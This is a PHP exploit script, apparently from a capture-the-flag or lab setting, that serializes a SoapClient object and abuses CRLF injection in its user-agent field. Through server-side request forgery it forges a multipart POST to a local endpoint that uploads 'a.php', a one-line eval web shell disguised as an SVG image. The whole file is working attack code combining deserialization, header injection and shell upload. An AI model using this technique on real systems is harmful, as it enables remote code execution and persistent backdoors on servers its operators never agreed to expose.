<?php

class get_form_data_soap{
	
	static public $url = 'http://127.0.0.1:35810/config/file.php';
	static public $ua = 'DQ';
	static public $params = array();
	static public $data = array('id' => 'exp_2333');
	static public $file = array('file' => array('filename'=>'a.php','type'=>'image/svg+xml','content'=>'<?=eval($_GET[1])?>')); # file_get_contents(*);
	static public $cookie = array('PHPSESSID' => '2333');
	static public $headers = array('z'=>'ls');
	
	private function soap_data($config){
		
		$cookie = array();
		$headers = array();
		foreach($config['cookies'] as $key => $value){
			array_push($cookie,$key.'='.$value);
		}
		foreach($config['headers'] as $key => $value){
			array_push($headers,$key.':'.$value);
		}
	
		$params = http_build_query($config['params']);	
		
		$fuzz = str_repeat('-',24).md5(time().md5(mt_rand()));
		$data = '';
		foreach($config['data'] as $key => $value){
			$data.=join("\x0d\x0a",array($fuzz,"Content-Disposition: form-data; name=\x22{$key}\x22",'',$value,''));
		}
		foreach($config['file'] as $key => $value){
			$data.=join("\x0d\x0a",array($fuzz,"Content-Disposition: form-data; name=\x22{$key}\x22; filename=\x22{$value['filename']}\x22","Content-Type: {$value['type']}",'',$value['content'],''));
		}
		$data.=$fuzz.'--';
		$content_type = 'Content-Type: multipart/form-data; boundary='.substr($fuzz,2);
		$content_length = 'Content-Length: '.strlen($data);
		$contents = join("\x0d\x0a",array($config['ua'],'Cookie: '.join(';',$cookie),join("\x0d\x0a",$headers),$content_type,$content_length))."\x0d\x0a\x0d\x0a".$data;
		
		$soap = new SoapClient(null, array(
			'location' => $config['url'].'?'.$params,
			'user_agent' => $contents,
			'uri' => '2333'
		));
		
		#echo str_replace("\x0a",'<br>',$contents);

		return serialize($soap);
	}
	
	public function __toString(){
	
		return $this->soap_data(array(
				'url' => self::$url,
				'ua' => self::$ua,
				'params' => self::$params,
				'data' => self::$data,
				'file' => self::$file,
				'cookies' => self::$cookie,
				'headers' => self::$headers
				));	
	}
	
}

echo (string) new get_form_data_soap();

?>
